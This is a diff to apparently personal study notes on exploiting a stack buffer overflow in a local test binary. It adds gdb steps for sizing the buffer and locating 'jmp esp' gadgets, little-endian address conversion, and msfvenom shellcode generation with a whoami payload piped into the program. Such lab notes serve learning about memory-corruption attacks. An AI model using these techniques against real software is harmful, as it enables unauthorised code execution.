@@ -233,6 +233,32 @@ file
 <<<    #can be used to pass a string to an executable as input
 
 ```
+### steps
+- determin type of input the executable can take
+- determin how much input executable can take
+- analyze the program to determine method to exploit
+- gdb the program to ensure overflow into pointer
+- utilize the address of the pointer to determine exact length of buffer
+- utilize a blank slate ```env - gdb ./func```
+  - ```unset env COLUMNS```
+  - ```unset env LINES```
+  - ```show env```
+  - ```run```
+- overflow with f
+- ```info proc map```
+- obtain the start of the address under heap and the last of the stack
+- create a find command for these locations.
+  - ```find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4```
+- utilize the first 4 addresses
+- seperate into bytes and convert indian
+### example
+```
+#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
+#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
+#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
+#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
+```
+
 ### GDB demo commands
 ```
 info
@@ -247,6 +273,7 @@ info proc map
 
 
 ```
+```
 find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
 
 first 4
@@ -255,7 +282,7 @@ first 4
 0xf7f588ab
 0xf7f645fb
 0xf7f6460f
-
+```
 ### msfconsole stuff
 ```
 msfconsole
@@ -263,6 +290,11 @@ use payload/linux/x86/exec
 show options
 set CMD whoami
 generate -b '\x00' -f python
+
+
+msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+
+./func <<<$(./linbuffer.py)
 
 ```
 
